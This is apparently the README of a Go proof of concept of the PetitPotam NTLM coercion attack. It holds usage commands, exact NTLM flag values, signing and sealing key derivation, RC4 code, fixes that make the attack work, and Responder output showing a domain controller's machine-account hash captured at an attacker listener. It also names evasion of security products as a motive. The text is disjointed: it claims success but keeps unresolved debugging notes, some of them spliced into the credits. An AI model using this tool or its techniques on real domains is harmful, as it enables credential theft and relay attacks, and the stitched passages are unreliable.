# Goercer - PetitPotam PoC with DCERPC PKT_PRIVACY

A Go implementation of the PetitPotam NTLM coercion attack using **DCERPC authentication level 6 (PKT_PRIVACY)** with full encryption and signing.

## ✅ Status: **WORKING**

Successfully coerces Windows domain controllers to authenticate to an attacker-controlled listener, capturing the machine account NTLMv2 hash.

**Tested Against**: Windows Server 2019 Domain Controller (10.1.1.14 / DESKTOP-NL7DJHI)
**Result**: ✅ Machine account hash captured via Responder

## Usage

```bash
go build -o goercer goercer_full.go
./goercer <target_dc> <listener_ip> <username> <password> <domain>
```

**Example**:

```bash

# Terminal 1: Start Responder
sudo responder -I eth0 -v

# Terminal 2: Run the attack
./goercer <target_dc> <listener_ip> <username> <password> <domain>
```

Common Errors and Solutions**:

1. **ACCESS_DENIED (0x00000005)**
   - **Cause**: Missing `NTLMSSP_NEGOTIATE_TARGET_INFO` or `NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY` in Type 1
   - **Fix**: Ensure both flags are set in Negotiate message

2. **Encryption mismatch / Decryption failures**
   - **Cause**: RC4 cipher being reset between requests
   - **Fix**: Use single continuous RC4 cipher handle

3. **Wrong pipe/UUID**
   - **Cause**: Using `\pipe\efsrpc` with `df1941c5-fe89-4e79-bf10-463657acf44d`
   - **Fix**: Use `\pipe\lsarpc` with `c681d488-d850-11d0-8c52-00c04fd90f7e`

4. **Wrong NTLMv2 identity**
   - **Cause**: Uppercasing both user and domain
   - **Fix**: Only uppercase the username: `uppercase(user) + domain`

5. **Domain name in Authenticate message**
   - **Cause**: Uppercasing domain in Type 3
   - **Fix**: Send domain as-is (not uppercased) in UTF-16LE

---

## Python Reference (impacket PetitPotam

---

## Technical Implementation

### Critical Requirements for Success

The attack **requires** these specific NTLM flags to be set correctly:

#### Type 1 (Negotiate) Message Flags - **CRITICAL**

```go
0x20000000 | // NTLMSSP_NEGOTIATE_128
0x40000000 | // NTLMSSP_NEGOTIATE_KEY_EXCH  
0x02000000 | // NTLMSSP_NEGOTIATE_VERSION
0x00800000 | // NTLMSSP_NEGOTIATE_TARGET_INFO ⚠️ REQUIRED FOR NTLMv2
0x00080000 | // NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY ⚠️ REQUIRED FOR NTLMv2
0x00000200 | // NTLMSSP_NEGOTIATE_NTLM
0x00000004 | // NTLMSSP_REQUEST_TARGET
0x00000001 | // NTLMSSP_NEGOTIATE_UNICODE
0x00000010 | // NTLMSSP_NEGOTIATE_SIGN
0x00000020   // NTLMSSP_NEGOTIATE_SEAL
```

**Without `NTLMSSP_NEGOTIATE_TARGET_INFO` and `NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY` in Type 1, Windows will reject the authentication with ACCESS_DENIED before attempting coercion.**

### Implementation Architecture

1. **SMB Connection** (`github.com/jfjallid/go-smb/smb`)
   - Connect to `\\target\IPC$`
   - NTLM authentication at SMB layer
   - Open named pipe: `\pipe\lsarpc` (NOT `\pipe\efsrpc`)

2. **DCERPC Bind**
   - UUID: `c681d488-d850-11d0-8c52-00c04fd90f7e` (lsarpc interface)
   - Authentication: NTLM with PKT_PRIVACY (level 6)
   - 3-way handshake: Bind → BindAck → Auth3

3. **NTLM Authentication**
   - **Type 1 (Negotiate)**: Send with NTLMv2-required flags
   - **Type 2 (Challenge)**: Receive from server, extract targetInfo
   - **Type 3 (Authenticate)**: Build NTLMv2 response with:
     - NTLMv2 hash: `HMAC-MD5(NT hash, uppercase(user) + domain)`
     - Client challenge (8 random bytes)
     - Timestamp (Windows FILETIME format)
     - targetInfo from Challenge + TARGET_NAME AV_PAIR
     - MIC (Message Integrity Check): `HMAC-MD5(sessionKey, Type1 + Type2 + Type3)`

4. **DCERPC Encryption (PKT_PRIVACY)**
   - Session key derivation with KEY_EXCH
   - Sign key: `MD5(sessionKey + "session key to client-to-server signing key magic constant\x00")`
   - Seal key: `MD5(sessionKey + "session key to client-to-server sealing key magic constant\x00")`
   - **Critical**: RC4 cipher is continuous stream (never reset between messages)
   - **Encryption order**: Encrypt stub FIRST, then sign (signature encrypts checksum)

5. **MS-EFSRPC Call**
   - Function: `EfsRpcOpenFileRaw` (opnum 0) or `EfsRpcEncryptFileSrv` (opnum 4)
   - Parameter: UNC path to attacker's listener (`\\10.1.1.99\test\Settings.ini`)
   - Server attempts to access UNC path, triggering NTLM authentication to listener

---

## Key Technical Details

### Why PKT_PRIVACY (Level 6)?

Most PetitPotam implementations use unauthenticated DCERPC. This implementation uses **PKT_PRIVACY** for:

- Understanding full DCERPC authentication mechanics
- Learning NTLM encryption/signing implementation
- Demonstrating encryption doesn't prevent coercion
- Bypassing potential security products that block unauthenticated RPC

### NTLMv2 Hash Calculation

```go
// Identity for NTLMv2: uppercase(user) + domain (domain NOT uppercased)
identity := uppercaseString(user) + domain
ntlmv2Hash := hmac_md5(ntHash, utf16le(identity))
```

**Critical**: Only the username is uppercased, NOT the domain name.

### RC4 Stream Cipher

The RC4 cipher handle **must be continuous** across all requests:

```go
// Initialize ONCE
auth.clientSealHandle, _ = rc4.NewCipher(auth.clientSealKey)

// Use same handle for ALL subsequent requests (never reinitialize)
auth.clientSealHandle.XORKeyStream(encryptedStub, paddedStub)
```

### Encryption Order for DCERPC

```go
// 1. Encrypt the stub FIRST
auth.clientSealHandle.XORKeyStream(encryptedStub, paddedStub)

// 2. THEN create signature (which encrypts the checksum with continued RC4 stream)
verifier := createNTLMSignature(auth, messageToSign)

// 3. Replace plaintext stub with encrypted stub in packet
copy(packet[stubStartPos:], encryptedStub)
```

This order is **critical** - the signature's checksum encryption uses the continued RC4 stream after encrypting the stub.

### Troubleshooting Past Issues

**Debug Output Shows**:

- Filtering working: 210 bytes → 206 bytes (removed Flags & Channel Bindings)
- NTLM response: 302 bytes (matches Python's working implementation)
- TARGET_NAME: "cifs/DESKTOP-NL7DJHI" (40 bytes)
- `/tmp/targetinfo_debug.bin` proves filtered data is correct

**Packet Capture Shows**:

- NTLM response: 330 bytes (28 bytes too large)
- AV_PAIRS include Flags (0x0006) and Channel Bindings (0x000a) that should be filtered
- Frame 15 in go12.pcapng shows `06 00 04 00` (Flags) present

**Mystery**: Code builds correct filtered targetInfo (proven by debug file), but packet contains unfiltered Challenge targetInfo. Somewhere between building the targetInfo and it appearing in the packet, the original Challenge data is being used instead of our filtered version.

### Python Reference (Working)

We know for certain this method works, so lets start here:

```text
../PetitPotam/PetitPotam.py -u <username> -d <domain> -pipe efsr <listener_ip> <target_dc>
/home/path/PetitPotam.py:23: SyntaxWarning: invalid escape sequence '\ '
  | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Password:
Trying pipe efsr
[-] Connecting to ncacn_np:10.1.1.14[\PIPE\efsrpc]
[+] Connected!
[+] Binding to df1941c5-fe89-4e79-bf10-463657acf44d
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

```text
sudo ./Responder.py -I ens18 -v                                                 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[*] Sponsor this project: [USDT: TNS8ZhdkeiMCT6BpXnj4qPfWo3HpoACJwv] , [BTC: 15X984Qco6bUxaxiR8AmTnQQ5v1LJ2zpNo]

[+] Poisoners:
    LLMNR                      [OFF]
    NBT-NS                     [OFF]
    MDNS                       [OFF]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [OFF]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [OFF]
    SQL server                 [OFF]
    FTP server                 [OFF]
    IMAP server                [OFF]
    POP3 server                [OFF]
    SMTP server                [OFF]
    DNS server                 [OFF]
    LDAP server                [OFF]
    MQTT server                [OFF]
    RDP server                 [OFF]
    DCE-RPC server             [OFF]
    WinRM server               [OFF]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [ens18]
    Responder IP               [10.1.1.99]
    Responder IPv6             [fe80::953e:180:c1f4:45a6]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-TCLLLONX0HR]
    Responder Domain Name      [B3OT.LOCAL]
    Responder DCE-RPC Port     [47876]
---

## Implementation Notes

### Why Not Use Unauthenticated DCERPC?

This implementation uses **PKT_PRIVACY** (authenticated + encrypted) rather than unauthenticated DCERPC because:

1. **Learning opportunity**: Understanding full NTLM authentication, encryption, and signing
2. **Evasion potential**: Some security products may flag unauthenticated RPC calls
3. **Demonstrates encryption is not protection**: Even with encryption, coercion still works
4. **Real-world scenarios**: Some environments may block unauthenticated RPC

The attack works **equally well** with unauthenticated DCERPC, which is simpler but less educational.

### Auth3 and WritePipe

This implementation uses `WritePipe` instead of `Transceive` for Auth3 because:
- Auth3 is "fire-and-forget" (no response expected)
- `Transceive` would hang waiting for a response that never comes
- `WritePipe` + `ReadPipe` allows us to get the SMB Write Response and continue

---

## References

- **MS-EFSR**: Encrypting File System Remote (EFSRPC) Protocol
- **MS-RPCE**: Remote Procedure Call Protocol Extensions  
- **MS-NLMP**: NT LAN Manager (NTLM) Authentication Protocol
- **PetitPotam**: Original PoC by @topotam77
- **impacket**: Python implementation reference

---

## Complete Working Solution Summary

After extensive debugging and analysis comparing with Python impacket, the following issues were identified and fixed:

### Critical Fixes Required

1. **Type 1 Flags** ⚠️ MOST CRITICAL
   - **Problem**: Missing `NTLMSSP_NEGOTIATE_TARGET_INFO` (0x00800000) and `NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY` (0x00080000)
   - **Impact**: Windows rejected authentication with ACCESS_DENIED before attempting coercion
   - **Fix**: Add both flags to Type 1 Negotiate message
   - **Lesson**: These flags signal NTLMv2 intent to server - without them, server rejects at NTLM layer

2. **Pipe and UUID**
   - **Problem**: Using `\pipe\efsrpc` with UUID `df1941c5-fe89-4e79-bf10-463657acf44d`
   - **Impact**: Wrong interface binding
   - **Fix**: Use `\pipe\lsarpc` with UUID `c681d488-d850-11d0-8c52-00c04fd90f7e`
   - **Lesson**: Python PetitPotam uses lsarpc despite calling MS-EFSRPC functions

3. **NTLMv2 Identity Calculation**
   - **Problem**: Uppercasing both username AND domain: `uppercase(user + domain)`
   - **Impact**: Wrong NTLMv2 hash, authentication failure
   - **Fix**: Only uppercase username: `uppercase(user) + domain`
   - **Lesson**: MS-NLMP spec and impacket only uppercase the user component

4. **Domain Name in Type 3**
   - **Problem**: Sending uppercased domain in Authenticate message
   - **Impact**: Signature/MIC validation failures
   - **Fix**: Send domain as-is (not uppercased) in UTF-16LE
   - **Lesson**: Type 3 domain field should preserve original casing

5. **RC4 Cipher Continuity**
   - **Problem**: Creating new RC4 cipher for each request
   - **Impact**: Encryption keystream out of sync, decryption failures
   - **Fix**: Initialize RC4 once, reuse same cipher handle for all operations
   - **Lesson**: RC4 is a stream cipher - state must persist across all encryptions

6. **Encryption Order**
   - **Problem**: Signing before encrypting, or encrypting then signing separately
   - **Impact**: RC4 keystream bytes consumed in wrong order
   - **Fix**: Encrypt stub first, THEN sign (signature encrypts checksum with continued stream)
   - **Lesson**: impacket's SEAL function shows exact order - stub uses bytes 0..N, checksum uses N+1..N+8

### Verification Steps

To verify each fix:

```bash
# 1. Check NTLM flags in Wireshark
# Type 1 should show: TARGET_INFO, EXTENDED_SESSIONSECURITY flags set

# 2. Verify pipe and UUID
# Should see: \pipe\lsarpc and UUID c681d488-d850-11d0-8c52-00c04fd90f7e

# 3. Check NTLMv2 response
# Response length should be ~302 bytes (not 330)

# 4. Monitor Responder
# Should receive callback from target DC
# Captures: DESKTOP-NL7DJHI$::splat:...(NTLMv2 hash)

# 5. Check DCERPC responses
# Should get type 0x02 (Response), not 0x03 (Fault)
```

### Testing

```bash
# Terminal 1: Responder
sudo responder -I eth0 -v

# Terminal 2: Attack
go build -o goercer goercer_full.go
./goercer <target_dc> <listener_ip> <username> <password> <domain>

# Expected output:
# [+] DCERPC authentication complete!
# [+] Check Responder for callback!

# Responder should show:
# [SMB] NTLMv2-SSP Client   : 10.1.1.14
# [SMB] NTLMv2-SSP Username : domain\MACHINE$
# [SMB] NTLMv2-SSP Hash     : MACHINE$::domain:...
```

---

## Dependencies: go-smb-fork

This project uses a customized fork of the go-smb library with specialized DCERPC/named pipe enhancements:

### What is go-smb-fork?

The `go-smb-fork` directory contains v0.6.7 of `github.com/jfjallid/go-smb` with **5 additional methods** for DCERPC named pipe communication. The fork is NOT a divergent branch - it's the upstream library (v0.6.7) from `github.com/jfjallid/go-smb` with specialized enhancements.

### Why it exists

The upstream go-smb library focuses on high-level SMB file operations and lacks low-level named pipe primitives needed for DCERPC. This implementation requires fine-grained control over:

- Message-oriented pipe operations (named pipes use offset=0, not file positions)
- Fire-and-forget writes (Auth3 packets don't expect responses)
- Pipe-specific error handling (EOF, broken pipe, disconnected states)

### Modifications (5 new methods added to upstream)

**In `smb/connection.go`:**

- `sendNoWait()` - Fire-and-forget send operation. Waits for SMB ack but doesn't return DCERPC response. Used for Auth3 packets (2-second timeout).

**In `smb/session.go` (on File struct):**

- `WritePipe(data)` - Write to named pipe with SMB Write Response handling. Always uses offset=0 (pipes are message-oriented).
- `ReadPipe(b)` - Read from named pipe with pipe-specific error handling. Handles EOF, broken pipe, and disconnected states.
- `WriteFileNoRecv(data, offset)` - Write without waiting for response. Also fire-and-forget for Auth3.

**In `smb/session.go` (on Connection struct):**

- `WriteIoCtlReqNoWait(req)` - IOCTL request without response. Wrapper around `sendNoWait()`.

### Code layout

```text
go-smb-fork/
├── smb/
│   ├── connection.go          (+ sendNoWait method)
│   ├── session.go             (+ WritePipe, ReadPipe, WriteFileNoRecv, WriteIoCtlReqNoWait)
│   └── dcerpc/                (unchanged - library's DCERPC functions)
└── ... (rest of upstream library)
```

### Usage in goercer

The main code uses `WritePipe()` and `ReadPipe()` throughout:

- Lines 229-232: Initial Bind packet send/receive
- Lines 242-246: BindAck response handling  
- Lines 272-276: Auth3 packet send
- Lines 1014-1018: Authenticated request send/receive

Without these methods, the code would need to use low-level IOCTL calls directly, making it significantly more verbose and less maintainable.

---

## Credits

- **@topotam77**: Original PetitPotam discovery and PoC
- **impacket team**: Reference NTLM/DCERPC implementation that made this possible
- **go-smb** (jfjallid): Go SMB client library [go-smb](https://github.com/jfjallid/go-smb)
- **MS-EFSR, MS-RPCE, MS-NLMP**: Microsoft protocol specificationstargetInfo, and temp blob goes into ntlmv2Resp - verify nothing is corrupting this chain
**Compare with Python**: Python's working implementation (frame 80 in capthatbooty.pcapng) has 302-byte NTLM response without Flags/Channel Bindings - our code SHOULD match this

**Files to Check**:

- `goercer_full.go` lines 305-360: createNTLMAuthenticate function
- `goercer_full.go` lines 576-585: buildTempBlob function  
- `goercer_full.go` lines 624-668: addTargetNameToAVPairs function (filtering happens here)

**Debug Artifacts**:

- `/tmp/targetinfo_debug.bin`: Contains correct filtered targetInfo (254 bytes, no Flags/Channel Bindings)
- `go12.pcapng`: Shows NTLM Authenticate with unfiltered data (330 bytes, has Flags/Channel Bindings)
- `capthatbooty.pcapng`: Python's working capture for reference

**Test Command**:

```bash
cd /path/to/goercer
./goercer_full <target_dc> <listener_ip> <username> <password> <domain>
# Check /tmp/targetinfo_debug.bin and compare with packet capture
```
